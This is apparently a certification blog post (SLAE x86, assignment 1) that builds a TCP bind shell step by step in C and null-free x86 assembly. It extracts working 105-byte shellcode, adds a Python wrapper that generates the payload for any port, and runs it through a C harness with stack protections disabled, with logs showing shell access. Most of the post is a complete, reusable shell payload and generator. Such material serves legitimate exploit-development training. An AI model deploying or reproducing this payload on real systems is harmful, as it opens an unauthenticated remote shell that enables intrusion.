---
title:  "SLAE x86 Assignment 1: TCP Bind Shell"
header:
  teaser: "/assets/images/slae32.png"
  teaser_home_page: true
#categories:
#  - exploit dev
classes: wide
#tags:
#  - exploit dev
#  - slae
---

### TCP Bind Shell
------

* Binds to a port
* Executes a shell on an incoming connection
* Port number should be easily configurable

#### Concept 
-----

A TCP Bind shell will bind a shell to a specific network port on a host, listening for an incoming connection (via the TCP protocol).

![Bind Shell](/assets/images/bind_shell.jpg)

Bind shells are easily blocked by firewalls and inbound filtering rules along with NAT, preventing unsolicited incoming connections (except for certain ports/well-known services). 

#### TCP Bind Shell in C
--------

The following C skeleton code will be used to demonstrate the TCP Bind shell from a high-level language perspective. 

This will be used as a template for the low-level assembly code to follow:

```c
#include <stdio.h>  
#include <sys/types.h>   
#include <sys/socket.h>  
#include <netinet/in.h>  
  
int host_sockid;  // socket for host  
int client_sockid;  // socket for client  
      
struct sockaddr_in hostaddr;  // sockaddr struct  
  
int main()  
{  
    // 1st syscall - create socket  
    host_sockid = socket(PF_INET, SOCK_STREAM, 0);  
  
    // Create sockaddr struct 
    hostaddr.sin_family = AF_INET;  // consists of AF_INET
    hostaddr.sin_port = htons(4444);  // bind socket using port 4444  
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);  // listen on any interface
  
    // 2nd syscall - bind socket to IP/Port in sockaddr struct  
    bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));  
      
    // 3rd syscall - listen for incoming connections  
    listen(host_sockid, 2);  
  
    // 4th syscall - accept incoming connections    
    client_sockid = accept(host_sockid, NULL, NULL);  
  
    // 5th syscall - duplicate file descriptors for STDIN, STDOUT and STDERR  
    dup2(client_sockid, 0);  
    dup2(client_sockid, 1);  
    dup2(client_sockid, 2);  
  
    // 6th syscall - execute /bin/sh using execve  
    execve("/bin/sh", NULL, NULL);  
    close(host_sockid);  
      
    return 0;  
}
```

#### POC (C Code)
------

The C code is compiled as an executable ELF binary and executed:

```bash
osboxes@osboxes:~/Downloads/SLAE$ gcc shell_bind_tcp_poc.c -o shell_bind_tcp_poc
osboxes@osboxes:~/Downloads/SLAE$ ./shell_bind_tcp_poc 

```

A separate terminal demonstrating a successful bind connection and shell on the local host (via port 4444):

```bash
osboxes@osboxes:~$ netstat -antp | grep 4444
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      7041/shell_bind_tcp_poc
osboxes@osboxes:~$ nc -nv 127.0.0.1 4444
Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
id
uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
```

#### TCP Bind Shell in Assembly
--------------

Note the various syscalls in the C code which will be utilised in the upcoming Assembly code:

* socket -> Creates a socket
* bind -> Binds the socket to a port
* listen -> Configures the socket to listen for incoming connections
* accept -> Accepts connections on the created socket
* dup2 -> Redirects STDIN, STDOUT, and STDERR to the incoming client connection
* execve -> Executes a shell

The syscalls in the C code relate to the socket network access protocol as referenced below in the Linux master header file:

```bash
osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/linux/net.h 

#define SYS_SOCKET	1		/* sys_socket(2)		*/
#define SYS_BIND	2		/* sys_bind(2)			*/
#define SYS_CONNECT	3		/* sys_connect(2)		*/
#define SYS_LISTEN	4		/* sys_listen(2)		*/
#define SYS_ACCEPT	5		/* sys_accept(2)		*/
```

A socket is defined in the man pages with domain, type and protocol arguments:

```bash
osboxes@osboxes:~/Downloads/SLAE$ man socket

SOCKET(2)                              Linux Programmer's Manual                             SOCKET(2)

NAME
       socket - create an endpoint for communication

SYNOPSIS
       #include <sys/types.h>          /* See NOTES */
       #include <sys/socket.h>

       int socket(int domain, int type, int protocol);

DESCRIPTION
       socket() creates an endpoint for communication and returns a descriptor.

       The  domain  argument  specifies a communication domain; this selects the protocol family which
       will be used for communication.  These families are defined in <sys/socket.h>.   The  currently
       understood formats include:

       Name                Purpose                          Man page
       AF_UNIX, AF_LOCAL   Local communication              unix(7)
       AF_INET             IPv4 Internet protocols          ip(7)
```

Using the C code as a reference and template for the Assembly code, the memory registers are initialized and cleared by performing an XOR operation against themselves which sets their values to '0':

```nasm
        ; initialize registers
        xor eax, eax
        xor ebx, ebx
        xor esi, esi
```

#### 1st Syscall (Create Socket)
----

To create the socket syscall, a value is needed in the EAX register to call socket:

```bash 
osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket
#define __NR_socketcall	102
```

The header file reveals the code for socket is 102. Converting 102 from decimal to hex equates to the hex equivalent of 0x66, this value will be placed in the lower half of EAX.

The next values are that of the socket properties as defined. The integer values for type (SOCK_STREAM) and domain (AF_INET/PF_INET) can be found in the socket header file:

```bash
osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/i386-linux-gnu/bits/socket.h
SOCK_STREAM = 1,		/* Sequenced, reliable, connection-based
#define	PF_INET		2	/* IP protocol family.  */
```

The last argument value for int protocol is going to be ‘0’ to accept any protocol according to the man pages definition for socket: 

```nasm
        ; push socket values onto the stack
        push esi        ; push 0 onto the stack, default protocol
        push 0x1        ; push 1 onto the stack, SOCK_STREAM
        push 0x2        ; push 2 onto the stack, AF_INET
```

The newly created socket can be identified by storing the value of EAX into the EDX register as reference for a later stage (with the ability to use EAX in subsequent system calls):

```nasm
	mov edx, eax   ; save the return value
```

1st Syscall (Assembly code section):

```nasm
        ; 1st syscall - create socket
        mov al, 0x66    ; hex value for socket
        mov bl, 0x1     ; socket
        mov ecx, esp    ; pointer to the arguments pushed
        int 0x80        ; call the interrupt to create the socket, execute the syscall
        mov edx, eax    ; save the return value
```

#### 2nd Syscall (Bind Socket to IP/Port in Sockaddr Struct)
-----

The definition of the bind syscall function in the man pages describes the arguments required:

```bash
osboxes@osboxes:~/Downloads/SLAE$ man bind

BIND(2)                                Linux Programmer's Manual                               BIND(2)

NAME
       bind - bind a name to a socket

SYNOPSIS
       #include <sys/types.h>          /* See NOTES */
       #include <sys/socket.h>

       int bind(int sockfd, const struct sockaddr *addr,
                socklen_t addrlen);

DESCRIPTION
       When  a socket is created with socket(2), it exists in a name space (address family) but has no
       address assigned to it.  bind() assigns the address specified to by addr to the socket referred
       to  by the file descriptor sockfd.  addrlen specifies the size, in bytes, of the address struc-
       ture pointed to by addr.  Traditionally, this operation  is  called  "assigning  a  name  to  a
       socket".
```

The 3 arguments required:

* int sockfd -> A reference to the newly created socket (EAX was moved into EDX)
* const struct sockaddr *addr -> A pointer to the location on the stack of the sockaddr struct to be created
* socklen_t addrlen -> The length of an IP socket address is 16  

The structure for handling internet addresses can be viewed via the man pages in the header file:

```bash
osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/netinet/in.h

/* Structure describing an Internet (IP) socket address. */
#define __SOCK_SIZE__	16		/* sizeof(struct sockaddr)	*/
struct sockaddr_in {
  __kernel_sa_family_t	sin_family;	/* Address family		*/
  __be16		sin_port;	/* Port number			*/
  struct in_addr	sin_addr;	/* Internet address		*/
```

4 structures can be defined:

* struct sockaddr 
* AF_INET (Address family)
* Port Number
* Internet address

Since the stack grows from High to Low memory it is important to remember to place these arguments onto the stack in reverse order.

The Internet address will be set to 0.0.0.0 (opens bind port to all interfaces), and pushed onto the stack with the value of ECX and EDX.

The chosen port number will need to be converted from decimal 4444 to hex 115C, which equates to 0x5c11 in Little Endian format.

The chosen port number is then pushed onto the stack as the next argument. The word value 0x5c11 relates to port number 4444 in Little Endian format. 

The word value of 0x2 is pushed onto the stack which loads the value for AF_INET executing the syscall, which completes the creation of sockaddr struct.

The ESP stack pointer (top of the stack) is moved into the ECX register to store the const struct sockaddr *addr argument. 

The value of 16 (struct sockaddr) is pushed onto the stack, along with the zeros which equate to the IP address:

```nasm
	push esi        ; push 0 for bind address 0.0.0.0
        push word 0x5c11; bind port 4444 is set
        push word 0x2   ; AF_INET
        mov ecx, esp    ; move esp into ecx, store the const struct sockaddr *addr argument
        push 0x16       ; length of sockaddr struct, 16
        push ecx        ; push all zeros on the stack, equals IP parameter of 0.0.0.0
        push edx        ; push all zeros on the stack, equals IP parameter of 0.0.0.0
```    
    
The next instruction set moves the hex value for the socket function into the lower half of EAX, which is required for the bind syscall:

```nasm
	mov al, 0x66	; hex value for socket
```
    
Followed by an instruction to call the interrupt to execute the bind syscall: 

```nasm
    	mov bl, 2       ; sys_bind = 2
        mov ecx, esp    ; pointer to the arguments
        int 0x80        ; call the interrupt to execute the bind syscall
```

2nd Syscall (Assembly code section):

```nasm
	; 2nd syscall - bind socket to IP/Port in sockaddr struct
        push esi        ; push 0 for bind address 0.0.0.0
        push word 0x5c11; bind port 4444 is set
        push word 0x2   ; AF_INET
        mov ecx, esp    ; move esp into ecx, store the const struct sockaddr *addr argument
        push 0x16       ; length of sockaddr struct, 16
        push ecx        ; push all zeros on the stack, equals IP parameter of 0.0.0.0
        push edx        ; push all zeros on the stack, equals IP parameter of 0.0.0.0
        mov al, 0x66    ; hex value for socket
        mov bl, 2       ; sys_bind = 2
        mov ecx, esp    ; pointer to the arguments
        int 0x80        ; call the interrupt to execute the bind syscall
```

#### 3rd Syscall (Listen for incoming connections)
----

The listen syscall works by preparing the bind socket to listen for incoming connections. 

The man pages defines the arguments required for the listen syscall:

```bash
osboxes@osboxes:~/Downloads/SLAE$ man listen

LISTEN(2)                              Linux Programmer's Manual                             LISTEN(2)

NAME
       listen - listen for connections on a socket

SYNOPSIS
       #include <sys/types.h>          /* See NOTES */
       #include <sys/socket.h>

       int listen(int sockfd, int backlog);

DESCRIPTION
       listen()  marks the socket referred to by sockfd as a passive socket, that is, as a socket that
       will be used to accept incoming connection requests using accept(2).

       The sockfd argument is a file descriptor that  refers  to  a  socket  of  type  SOCK_STREAM  or
       SOCK_SEQPACKET.

       The  backlog  argument defines the maximum length to which the queue of pending connections for
       sockfd may grow.  If a connection request arrives when  the  queue  is  full,  the  client  may
       receive  an  error  with  an indication of ECONNREFUSED or, if the underlying protocol supports
       retransmission, the request may be ignored so that a later reattempt at connection succeeds.
```

A byte of 1 is pushed onto the stack to listen for 1 client at a time, the socket value is moved into the lower memory portion of EAX.

The listen syscall is executed using the code of 4, the program interrupt is called to execute the listen syscall.

3rd syscall (Assembly code section):

```nasm
        ; 3rd syscall - listen for incoming connections
        push byte 0x1   ; listen for 1 client at a time
        push edx        ; pointer to stack
        mov al, 0x66    ; socketcall
        mov bl, 0x4     ; sys_listen = 4
        mov ecx, esp    ; pointer to the arguments pushed
        int 0x80        ; call the interrupt to execute the listen syscall
```

#### 4th Syscall (Accept incoming connections)
----

The accept syscall is defined by the man pages as follows:

```bash
osboxes@osboxes:~/Downloads/SLAE$ man accept

ACCEPT(2)                              Linux Programmer's Manual                             ACCEPT(2)

NAME
       accept - accept a connection on a socket

SYNOPSIS
       #include <sys/types.h>          /* See NOTES */
       #include <sys/socket.h>

       int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);

       #define _GNU_SOURCE             /* See feature_test_macros(7) */
       #include <sys/socket.h>

       int accept4(int sockfd, struct sockaddr *addr,
                   socklen_t *addrlen, int flags);

DESCRIPTION
       The  accept()  system  call  is used with connection-based socket types (SOCK_STREAM, SOCK_SEQ-
       PACKET).  It extracts the first connection request on the queue of pending connections for  the
       listening  socket,  sockfd,  creates  a new connected socket, and returns a new file descriptor
       referring to that socket.  The newly created socket is not in the listening state.  The  origi-
       nal socket sockfd is unaffected by this call.
```

The next 3 arguments can all equal '0' according to the man pages definition of the accept syscall.

The 4 arguments required for accept4:

* sockfd -> EDX (reference of socket initially stored in EAX)
* addr -> ESI == 0
* addrlen -> ESI == 0
* flags -> ESI == 0

The socket value (stored in EDX) is pushed onto the stack: 

```nasm
        push esi        ; NULL
        push esi        ; NULL
        push edx        ; pointer to sockfd
```

The RETURN VALUE defined in the man pages for accept4 describes a new sockfd value returned after the accept syscall is executed.

The accept syscall is executed using the code of 5, the program interrupt is then called which executes the accept syscall:

```nasm
	mov al, 0x66    ; socketcall
        mov bl, 5       ; sys_accept = 5
        mov ecx, esp    ; pointer to arguments pushed
        int 0x80        ; call the interrupt to execute accept syscall
```

4th syscall (Assembly code section):

```nasm
	; 4th syscall - accept incoming connections
        push esi        ; NULL
        push esi        ; NULL
        push edx        ; pointer to sockfd
        mov al, 0x66    ; socketcall
        mov bl, 5       ; sys_accept = 5
        mov ecx, esp    ; pointer to arguments pushed
        int 0x80        ; call the interrupt to execute accept syscall
```

#### 5th Syscall (Duplicate File Descriptors for STDIN, STDOUT and STDERR)
------

The dup2 syscall works by creating a loop, and iterating 3 times to accomodate all 3 file descriptors loading into the accepted connection (providing an interactive bind shell session).

To redirect IO to the descriptor, a loop is initiated with the ECX register, commonly known as the counter register. 

The dup2 syscall code can be found in the header file below, converting 63 from decimal to hex equals 0x3f:

```bash
osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup2 
#define __NR_dup2 63
```

All required arguments of dup2 are in sockfd (stored in accept syscall), which will be moved into EBX.

The syscall code of 0x3f is moved in the lower part of the EAX memory region.

Whilst the signed flag is not set (JNS) - the counter register is decremented each time within the loop. Once the value of '-1' gets set in ECX, the signed flag will be set and the loop is broken (exits when $exc equals 0).

5th syscall (Assembly code section):

```nasm
	; 5th syscall - duplicate file descriptors for STDIN, STDOUT and STDERR
        mov edx, eax    ; save client file descriptor
	xor ecx, ecx	; clear ecx register
	mov cl, 3	; counter for file descriptors 0,1,2 (STDIN, STDOUT, STDERR)
	mov ebx, edx	; move socket into ebx (new int sockfd)

        loop_dup2:
        dec ecx         ; decrement ecx by 1 (new int sockfd)
	mov al, 0x3f  	; move the dup2 syscall code into the lower part of eax
        int 0x80      	; call interrupt to execute dup2 syscall
        jns loop_dup2   ; repeat for 1,0
```

#### 6th Syscall (Execute /bin/sh using Execve) 
------

The final syscall instructs the program to execute the execve syscall which essentially points to '/bin/sh'. 

The execve syscall is defined by the man pages as follows:

```bash
osboxes@osboxes:~/Downloads/SLAE$ man execve

EXECVE(2)                              Linux Programmer's Manual                             EXECVE(2)

NAME
       execve - execute program

SYNOPSIS
       #include <unistd.h>

       int execve(const char *filename, char *const argv[],
                  char *const envp[]);

DESCRIPTION
       execve()  executes  the  program pointed to by filename.  filename must be either a binary exe-
       cutable, or a script starting with a line of the form:

           #! interpreter [optional-arg]

       For details of the latter case, see "Interpreter scripts" below.

       argv is an array of argument strings passed to the new program.  By convention,  the  first  of
       these  strings should contain the filename associated with the file being executed.  envp is an
       array of strings, conventionally of the form key=value, which are passed as environment to  the
       new program.  Both argv and envp must be terminated by a NULL pointer.  The argument vector and
       environment can be accessed by the called program's main function, when it is defined as:

           int main(int argc, char *argv[], char *envp[])
```

This objective is achieved when a connection is made to the newly created bind port, in turn executing an interactive shell for an attacker on the target machine.

This instruction set will load the string '/bin/sh' onto the stack in reverse order, since the stack grows from high to low memory.

The execve syscall works with Null pointers and terminators, which requires a terminator to be placed onto the stack after clearing the EAX register and setting the value to '0':

```nasm
	xor eax, eax	; clear register
	push eax	; terminator placed onto the stack with value of 0
```

Before placing the string '/bin/sh' onto the stack (reverse order), it is important to remember to avoid Null Bytes and add padding where possible in the shellcode. 

To ensure that the string is divisible by 4, an additional character '/' is added to increase the characters from 7 to 8 resulting in '//bin/sh'.

Python can be used to interpret and extract the hex address, along with splitting the string up into 4 byte halves (clean hex address to use for the calls):

```python
osboxes@osboxes:~/Downloads/SLAE$ python
Python 2.7.3 (default, Feb 27 2014, 20:00:17) 
[GCC 4.6.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> a = '//bin/sh'
>>> a[::-1]
'hs/nib//'
>>> import binascii
>>> binascii.hexlify(b'hs/n')
'68732f6e'
>>> binascii.hexlify(b'ib//')
'69622f2f'
```

After the Null terminator has been pushed onto the stack to null terminate the '//bin/sh argument', the hex values for '//bin/sh' can then be pushed onto the stack (reverse order):

```nasm
	push 0x68732f6e ; push the end of "//bin/sh", 'hs/n'
        push 0x69622f2f ; push the beginning of "//bin/sh", 'ib//'
```

The EBX register will be used to carry the pointer location of the '//bin/sh' entity, which points EBC to the stack:

```nasm
	mov ebx, esp	; move pointer to '//bin/sh' into ebx, null terminated
```
Null out the EAX register by pushing the value of '0' onto the stack, then move the pointer to '//bin/sh' from EAX into EDX (Null terminated):

```nasm
	push eax        ; terminator placed onto the stack with value of 0
        mov edx, eax    ; move pointer to '//bin/sh' into edx, null terminated
```

ECX should point to the location of EBX, push EBX onto the stack and then move ESP into ECX:

```nasm
	push ebx        ; push 0 onto the stack
        mov ecx, esp    ; move pointer to '//bin/sh' into ecx, null terminated
```

The execve syscall code can be found in the header file below, converting 11 from decimal to hex equals 0xb:

```bash
osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep execve
#define __NR_execve 11
```

The value of 0xb is placed into the lower memory region of EAX.

Finally, the execve syscall and the program interrupt are called to execute the program, and initiate the full TCP Bind shell on the target machine:

```nasm
	mov al, 0xb     ; move syscall code for execve into al
        int 0x80        ; call the interrupt to execute execve syscall, execute '//bin/sh' shell
```

6th syscall (Assembly code section):

```nasm
	; 6th syscall - execute /bin/sh using execve
        xor eax, eax	; clear eax register
	push eax        ; terminator placed onto the stack with value of 0
        push 0x68732f6e ; push the end of "//bin/sh", 'hs/n'
        push 0x69622f2f ; push the beginning of "//bin/sh", 'ib//'
        mov ebx, esp    ; move pointer to '//bin/sh' into ebx, null terminated
        push eax        ; terminator placed onto the stack with value of 0
        mov edx, eax    ; move pointer to '//bin/sh' into edx, null terminated
        push ebx        ; push 0 onto the stack
        mov ecx, esp    ; move pointer to '//bin/sh' into ecx, null terminated
	mov al, 0xb     ; move syscall code for execve into al
        int 0x80        ; call the interrupt to execute execve syscall, execute '//bin/sh' shell
```

#### Assembly Code (Final)
-------------

````nasm
; Filename: shell_bind_tcp.nasm
; Author: h3ll0clar1c3
; Purpose: Bind shell on TCP port 4444, spawn a shell on incoming connection
; Compilation: ./compile.sh shell_bind_tcp
; Usage: ./shell_bind_tcp
; Testing: nc -nv 127.0.0.1 4444
; Shellcode size: 105 bytes
; Architecture: x86

global   _start

section .text
        _start:

        ; initialize registers
        xor eax, eax
        xor ebx, ebx
        xor esi, esi

        ; push socket values onto the stack
        push esi        ; push 0 onto the stack, default protocol
        push 0x1        ; push 1 onto the stack, SOCK_STREAM
        push 0x2        ; push 2 onto the stack, AF_INET
	
        ; 1st syscall - create socket
        mov al, 0x66    ; hex value for socket
        mov bl, 0x1     ; socket
        mov ecx, esp    ; pointer to the arguments pushed
        int 0x80        ; call the interrupt to create the socket, execute the syscall
        mov edx, eax    ; save the return value

        ; 2nd syscall - bind socket to IP/Port in sockaddr struct
        push esi        ; push 0 for bind address 0.0.0.0
        push word 0x5c11; bind port 4444 is set
        push word 0x2   ; AF_INET
        mov ecx, esp    ; move esp into ecx, store the const struct sockaddr *addr argument
        push 0x16       ; length of sockaddr struct, 16
        push ecx        ; push all zeros on the stack, equals IP parameter of 0.0.0.0
        push edx        ; push all zeros on the stack, equals IP parameter of 0.0.0.0
        mov al, 0x66    ; hex value for socket
        mov bl, 2       ; sys_bind = 2
        mov ecx, esp    ; pointer to the arguments
        int 0x80        ; call the interrupt to execute the bind syscall

        ; 3rd syscall - listen for incoming connections
        push byte 0x1   ; listen for 1 client at a time
        push edx        ; pointer to stack
        mov al, 0x66    ; socketcall
        mov bl, 0x4     ; sys_listen = 4
        mov ecx, esp    ; pointer to the arguments pushed
        int 0x80        ; call the interrupt to execute the listen syscall

        ; 4th syscall - accept incoming connections
        push esi        ; NULL
        push esi        ; NULL
        push edx        ; pointer to sockfd
        mov al, 0x66    ; socketcall
        mov bl, 5       ; sys_accept = 5
        mov ecx, esp    ; pointer to arguments pushed
        int 0x80        ; call the interrupt to execute accept syscall

        ; 5th syscall - duplicate file descriptors for STDIN, STDOUT and STDERR
        mov edx, eax    ; save client file descriptor
	xor ecx, ecx	; clear ecx register
	mov cl, 3	; counter for file descriptors 0,1,2 (STDIN, STDOUT, STDERR)
	mov ebx, edx	; move socket into ebx (new int sockfd)

        loop_dup2:
        dec ecx         ; decrement ecx by 1 (new int sockfd)
	mov al, 0x3f  	; move the dup2 syscall code into the lower part of eax
        int 0x80      	; call interrupt to execute dup2 syscall
        jns loop_dup2   ; repeat for 1,0

        ; 6th syscall - execute /bin/sh using execve
        xor eax, eax	; clear eax register
	push eax        ; terminator placed onto the stack with value of 0
        push 0x68732f6e ; push the end of "//bin/sh", 'hs/n'
        push 0x69622f2f ; push the beginning of "//bin/sh", 'ib//'
        mov ebx, esp    ; move pointer to '//bin/sh' into ebx, null terminated
        push eax        ; terminator placed onto the stack with value of 0
        mov edx, eax    ; move pointer to '//bin/sh' into edx, null terminated
        push ebx        ; push 0 onto the stack
        mov ecx, esp    ; move pointer to '//bin/sh' into ecx, null terminated
	mov al, 0xb     ; move syscall code for execve into al
        int 0x80        ; call the interrupt to execute execve syscall, execute '//bin/sh' shell
````

#### POC (Assembly Code) 
------

The Assembly code is compiled by assembling with Nasm, and linking with the following bash script whilst outputting an executable binary:

```bash
osboxes@osboxes:~/Downloads/SLAE$ cat compile.sh
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -o $1 $1.o

echo '[+] Done!'
```
The Assembly code compiled as an executable binary:

```bash
osboxes@osboxes:~/Downloads/SLAE$ ./compile.sh shell_bind_tcp
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
```

Strace is used to debug and monitor the interactions between the executable process and the Linux kernel, visually showing the system calls for the TCP Bind shell:

```bash
osboxes@osboxes:~/Downloads/SLAE$ strace -e socket,bind,listen,accept,dup2,execve ./shell_bind_tcp
execve("./shell_bind_tcp", ["./shell_bind_tcp"], [/* 21 vars */]) = 0
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
bind(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 22) = 0
listen(3, 1)                            = 0
accept(3, 
```

The compiled ELF binary is executed:

```bash
osboxes@osboxes:~/Downloads/SLAE$ ./shell_bind_tcp 

```

A separate terminal demonstrating a successful bind connection and shell on the local host (via port 4444):

```bash
osboxes@osboxes:~$ netstat -antp | grep 4444
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      3709/shell_bind_tcp
osboxes@osboxes:~$ nc -nv 127.0.0.1 4444
Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
id
uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
```

#### Configurable Port (Customize Shellcode) 
------

Objdump is used to extract the shellcode from the TCP Bind shell in hex format (Null free):

```bash
osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./shell_bind_tcp|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x31\xdb\x31\xf6\x56\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc2\x56\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1
\x6a\x16\x51\x52\xb0\x66\xb3\x02\x89\xe1\xcd\x80\x6a\x01\x52\xb0\x66\xb3\x04\x89\xe1\xcd\x80\x56\x56\x52\xb0\x66\xb3\x05\x89
\xe1\xcd\x80\x89\xc2\x31\xc9\xb1\x03\x89\xd3\x49\xb0\x3f\xcd\x80\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69
\x89\xe3\x50\x89\xc2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

Once the raw shellcode has been extracted, the last requirement to complete the assignment is to ensure the port number is easily configurable. 

This can be achieved by utilising a Python wrapper which takes a standard 2 byte port number, and checks the chosen port number to ensure the custom port is valid.

The shellcode variable defined within the script includes the original hardcoded shellcode for port 4444:

```python
#!/usr/bin/python

# Filename: shell_bind_tcp_wrapper.py
# Author: h3ll0clar1c3
# Purpose: Wrapper script to generate dynamic shellcode, configurable bind port number
# Usage: python shell_bind_tcp_wrapper.py <port>

import socket
import sys

shellcode = """
\\x31\\xc0\\x31\\xdb\\x31\\xf6\\x56\\x6a\\x01\\x6a\\x02\\xb0\\x66\\xb3\\x01\\x89\\xe1\\xcd\\x80\\x89\\xc2
\\x56\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x16\\x51\\x52\\xb0\\x66\\xb3\\x02\\x89\\xe1\\xcd
\\x80\\x6a\\x01\\x52\\xb0\\x66\\xb3\\x04\\x89\\xe1\\xcd\\x80\\x56\\x56\\x52\\xb0\\x66\\xb3\\x05\\x89\\xe1
\\xcd\\x80\\x89\\xc2\\x31\\xc9\\xb1\\x03\\x89\\xd3\\x49\\xb0\\x3f\\xcd\\x80\\x79\\xf9\\x31\\xc0\\x50\\x68
\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xc2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80
"""

if (len(sys.argv) < 2):
    print "Usage: python {name} <port>".format(name = sys.argv[0])
    exit()

port = int(sys.argv[1])

if port < 0 or port > 65535:
    print "Invalid port number, must be between 0 and 65535!"
    exit()
    
port = hex(socket.htons(int(sys.argv[1])))
shellcode = shellcode.replace("\\x11\\x5c", "\\x{b1}\\x{b2}".format(b1 = port[4:6], b2 = port[2:4]))

print("Generated shellcode using custom port: " + sys.argv[1])
print shellcode

print "Shellcode length: %d bytes" % len(shellcode)
if "\x00" in shellcode:
    print "WARNING: Null byte is present!"
else:
    print "No nulls detected"
```
The Python code dynamically generates shellcode in hex format based on the user input, calculating the shellcode length and checking for Null bytes in the process: 

```bash
osboxes@osboxes:~/Downloads/SLAE$ python shell_bind_tcp_wrapper.py 5555
Generated shellcode using custom port: 5555

\x31\xc0\x31\xdb\x31\xf6\x56\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc2\x56\x66\x68\x15\xb3\x66\x6a\x02\x89\xe1
\x6a\x16\x51\x52\xb0\x66\xb3\x02\x89\xe1\xcd\x80\x6a\x01\x52\xb0\x66\xb3\x04\x89\xe1\xcd\x80\x56\x56\x52\xb0\x66\xb3\x05\x89
\xe1\xcd\x80\x89\xc2\x31\xc9\xb1\x03\x89\xd3\x49\xb0\x3f\xcd\x80\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69
\x89\xe3\x50\x89\xc2\x53\x89\xe1\xb0\x0b\xcd\x80

Shellcode length: 422 bytes
No nulls detected
```

A simple C program scripted and edited with the newly generated shellcode:

```c
/**
* Filename: shellcode.c
* Author: h3ll0clar1c3
* Purpose: Bind shell on TCP port 5555, spawn a shell on incoming connection  
* Compilation: gcc -fno-stack-protector -z execstack -m32 shellcode.c -o shell_bind_tcp_final  
* Usage: ./shell_bind_tcp_final
* Testing: nc -nv 127.0.0.1 5555
* Shellcode size: 105 bytes
* Architecture: x86
**/

#include <stdio.h>
#include <string.h>

int main(void)
{
unsigned char code[] =
"\x31\xc0\x31\xdb\x31\xf6\x56\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc2\x56\x66\x68\x15"
"\xb3\x66\x6a\x02\x89\xe1\x6a\x16\x51\x52\xb0\x66\xb3\x02\x89\xe1\xcd\x80\x6a\x01\x52\xb0\x66\xb3\x04"
"\x89\xe1\xcd\x80\x56\x56\x52\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xc2\x31\xc9\xb1\x03\x89\xd3\x49\xb0"
"\x3f\xcd\x80\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xc2\x53\x89"
"\xe1\xb0\x0b\xcd\x80";

    printf("Shellcode length: %d\n", strlen(code));

    void (*s)() = (void *)code;
    s();

    return 0;
}
```

#### POC (Final Shellcode) 
------

The C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 105 bytes:

```bash
osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -z execstack -m32 shellcode.c -o shell_bind_tcp_final
osboxes@osboxes:~/Downloads/SLAE$ ./shell_bind_tcp_final
Shellcode length: 105

```

A separate terminal demonstrating a successful bind connection and shell on the local host (via port 5555):

```bash
osboxes@osboxes:~$ netstat -antp | grep 5555
tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN      21783/shell_bind_tcp_final
osboxes@osboxes:~$ nc -nv 127.0.0.1 5555
Connection to 127.0.0.1 5555 port [tcp/*] succeeded!
id
uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
```

##### SLAE Disclaimer ####
---------

This blog post has been created for completing the requirements of the [SLAE certification] [slae-link].

Student ID: PA-14936

GitHub Repo: [Code][github-code]

[slae-link]: http:/securitytube-training.com/online-courses/securitytube-linux-assembly-expert
[github-code]: https://github.com/h3ll0clar1c3/SLAE/tree/master/Exam/Assignment1
